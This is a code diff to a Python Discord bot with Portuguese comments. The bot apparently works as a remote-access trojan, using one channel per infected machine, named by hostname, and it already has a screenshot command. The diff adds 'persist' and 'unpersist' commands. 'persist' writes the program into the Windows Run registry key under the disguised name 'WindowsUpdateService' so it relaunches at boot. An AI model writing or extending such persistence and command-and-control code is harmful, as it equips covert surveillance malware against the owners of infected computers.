@@ -9,6 +9,7 @@ import time
 import urllib.request
 import json
 import shutil
+import sys
 
 # ======================== CONFIGURAÇÃO ========================
 
@@ -441,6 +442,50 @@ async def screenshot(interaction: discord.Interaction):
                 await interaction.followup.send("❌ Erro ao capturar screenshot: Arquivo não encontrado.")
         except Exception as e:
             await interaction.followup.send(f"❌ Erro ao capturar screenshot: {e}")
+    else:
+        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
+
+
+@bot.tree.command(name="persist", description="Ativa a persistência da máquina (execução automática no boot).")
+async def persist(interaction: discord.Interaction):
+    if interaction.channel.name.lower() == platform.node().lower():
+        await interaction.response.defer(thinking=True)
+        normal_activity()
+        try:
+            # Caminho absoluto do executável atual
+            exe_path = os.path.abspath(sys.argv[0])
+            reg_name = "WindowsUpdateService"
+
+            subprocess.run(
+                ["reg", "add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
+                 "/v", reg_name, "/t", "REG_SZ", "/d", exe_path, "/f"],
+                check=True,
+                shell=True
+            )
+            await interaction.followup.send("✅ Persistência ativada com sucesso.")
+        except Exception as e:
+            await interaction.followup.send(f"❌ Erro ao ativar persistência: {e}")
+    else:
+        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
+
+
+@bot.tree.command(name="unpersist", description="Remove a persistência da máquina.")
+async def unpersist(interaction: discord.Interaction):
+    if interaction.channel.name.lower() == platform.node().lower():
+        await interaction.response.defer(thinking=True)
+        normal_activity()
+        try:
+            reg_name = "WindowsUpdateService"
+
+            subprocess.run(
+                ["reg", "delete", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
+                 "/v", reg_name, "/f"],
+                check=True,
+                shell=True
+            )
+            await interaction.followup.send("🧹 Persistência removida com sucesso.")
+        except Exception as e:
+            await interaction.followup.send(f"❌ Erro ao remover persistência: {e}")
     else:
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
 
